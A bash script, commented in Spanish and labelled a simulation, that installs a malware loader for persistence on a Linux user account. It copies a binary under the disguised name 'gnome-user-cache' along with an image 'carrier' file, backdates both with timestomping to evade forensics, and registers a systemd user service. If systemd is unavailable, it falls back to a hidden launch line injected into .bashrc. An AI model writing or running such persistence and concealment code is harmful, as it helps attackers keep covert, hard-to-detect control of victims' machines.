#!/bin/bash

# Simulación de despliegue y persistencia
echo "[*] Iniciando secuencia de persistencia..."

TARGET_DIR="$HOME/.local/bin"
SERVICE_DIR="$HOME/.config/systemd/user"
LOADER_NAME="gnome-user-cache"
CARRIER_NAME="image.png"

mkdir -p "$TARGET_DIR"
mkdir -p "$SERVICE_DIR"

# 1. Mover artefactos
echo "[*] Instalando binarios en $TARGET_DIR..."
cp loader_v2 "$TARGET_DIR/$LOADER_NAME"
cp image.png "$TARGET_DIR/$CARRIER_NAME"

# 2. Timestomping (hacer que parezcan antiguos)
touch -r /bin/bash "$TARGET_DIR/$LOADER_NAME"
touch -r /bin/bash "$TARGET_DIR/$CARRIER_NAME"

# 3. Instalar servicio systemd
echo "[*] Configurando servicio systemd..."
cp gnome-user-cache.service "$SERVICE_DIR/"

# 4. Recargar systemd (simulado porque no tenemos dbus en este contenedor probablemente)
if systemctl --user daemon-reload >/dev/null 2>&1; then
    echo "[*] Systemd recargado."
    systemctl --user enable "$LOADER_NAME"
    systemctl --user start "$LOADER_NAME"
    echo "[*] Servicio iniciado exitosamente."
else
    echo "[!] Systemd no disponible o sin dbus."

    # Fallback a .bashrc
    BASHRC="$HOME/.bashrc"
    # Nota: Usamos paréntesis para subshell y evitar ruido en la terminal
    INJECTION="if ! pgrep -f 'worker_process' >/dev/null 2>&1; then (cd $TARGET_DIR && ./$LOADER_NAME >/dev/null 2>&1 &); fi"

    if [ -f "$BASHRC" ]; then
        if ! grep -Fq "worker_process" "$BASHRC"; then
            echo "[*] Inyectando persistencia en $BASHRC..."
            echo "" >> "$BASHRC"
            echo "# Session Init" >> "$BASHRC"
            echo "$INJECTION" >> "$BASHRC"
        else
            echo "[*] Persistencia en .bashrc ya presente."
        fi
    fi

    # Ejecución inmediata
    cd "$TARGET_DIR" && ./$LOADER_NAME &
    echo "[*] Proceso lanzado en background (PID $!)."
fi

echo "[*] Persistencia completada. El payload sobrevivirá al reinicio."
